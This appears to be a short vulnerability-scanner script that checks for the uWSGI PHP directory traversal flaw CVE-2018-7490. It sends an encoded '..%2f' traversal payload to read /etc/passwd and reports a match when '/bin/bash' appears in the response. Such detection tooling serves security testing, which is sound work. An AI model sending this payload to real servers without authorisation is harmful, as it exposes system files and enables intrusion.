#request url = var
#define payload =/..%2f..%2f..%2f..%2f..%2fetc/passwd
#define bug = /bin/bash
#define info = 存在uWSGI PHP Directory Traversal Vulnerability (CVE-2018-7490)

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
